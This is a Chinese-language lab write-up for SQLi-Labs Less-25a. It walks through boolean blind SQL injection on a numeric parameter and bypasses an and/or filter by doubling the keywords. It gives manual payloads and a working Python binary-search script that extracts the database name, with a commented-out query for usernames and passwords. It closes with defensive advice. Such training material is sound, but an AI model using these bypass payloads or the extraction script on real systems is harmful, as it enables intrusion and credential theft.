## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：困难
- 通关标识：识别出后台对 `and` 和 `or` 进行了无脑过滤，且页面无回显，利用“双写绕过”配合布尔盲注，通过 Python 脚本爆出数据。

## 二、大白话原理讲解
这关是 Less-25 的升级版。柜员（数据库）不仅没收了你的 `and` 和 `or`，还把“打印台”（回显）给撤了，连“抱怨”（报错）都不给了。

你输入 `1'` 试闭合？对不起，这关是数字型，不需要引号。
你输入 `union select` 想看数据？对不起，页面什么都不显示。
你输入 `and 1=1` 想测逻辑？对不起，`and` 被后台无情删除了。

**怎么破？**
1.  **不用引号**：直接写数字。
2.  **双写绕过**：把 `and` 写成 `anandd`，把 `or` 写成 `oorr`。
3.  **布尔盲注**：如果页面正常（`You are in...`），说明条件为真；如果页面空白，说明条件为假。咱们就像“猜谜语”一样，一个字母一个字母地猜。

## 三、解题步骤

**1. 验证逻辑真假**
在浏览器输入：
```text
?id=1 anandd 1=1
```
页面正常回显（`You are in...`）。
```text
?id=1 anandd 1=2
```
页面空白。
**结论**：双写绕过生效，布尔盲注通道打通。

**2. 手工测试猜解**
猜库名长度：
```text
?id=1 anandd length(database())=8
```
（页面正常，说明长度为 8）
猜第一个字母：
```text
?id=1 anandd ascii(substr(database(),1,1))=115
```
（页面正常，说明第一个字母 ASCII 码是 115，即 `s`）

**3. Python 自动化盲注脚本**
手工猜太慢了，我们需要写一个 Python 脚本来跑。利用二分法，几秒钟就能跑出结果：

```python
import requests

url = "http://127.0.0.1/sqli-labs-master/Less-25a/"
# 成功页面的特征
success_flag = "You are in"

def is_true(payload):
    r = requests.get(url + payload)
    return success_flag in r.text

def get_length(sql_query):
    for length in range(1, 50):
        # 使用 anandd 代替 and
        payload = f"?id=1 anandd length(({sql_query}))={length}"
        if is_true(payload):
            return length
    return 0

def get_data(sql_query, length):
    result = ""
    print(f"[*] 正在提取数据 (长度: {length})...")
    for i in range(1, length + 1):
        low, high = 32, 127
        while low <= high:
            mid = (low + high) // 2
            # 使用 anandd 代替 and
            payload = f"?id=1 anandd ascii(substr(({sql_query}),{i},1))>{mid}"
            if is_true(payload):
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[+] 当前结果: {result}")
    return result

if __name__ == "__main__":
    print("[*] 开始盲注爆破 Less-25a...")
    query = "select database()"
    # 如果你想查账号密码，把下面这行注释取消，替换掉上面那行
    # query = "select concat(username,0x3a,passwoorrd) from users limit 0,1"
    
    length = get_length(query)
    if length > 0:
        data = get_data(query, length)
        print(f"\n[🎉] 成功爆出数据: {data}")
    else:
        print("\n[-] 没跑通，请检查 URL 或双写规则。")
```

**4. 运行结果**
在终端运行脚本，成功爆出 `security` 或 `Dumb:Dumb`。

## 四、踩坑记录与复盘
1. **数字型盲注**：没有单引号，直接拼数字。
2. **双写绕过**：`anandd` 会被过滤为 `and`，一定要记住写双写。
3. **`password` 过滤**：如果查账号密码报错，记得把 `password` 写成 `passwoorrd`。

## 五、总结与防御
**本题总结**：
Less-25a 是一道典型的盲注 + WAF 绕过题。只要掌握双写绕过和二分法盲注，没有任何回显也能把数据猜出来。

**安全防御建议**：
- **预编译语句（PDO/MySQLi）**：彻底隔离代码与数据。
- **统一错误响应**：不要有成功/失败的页面差异，让盲注无从下手。
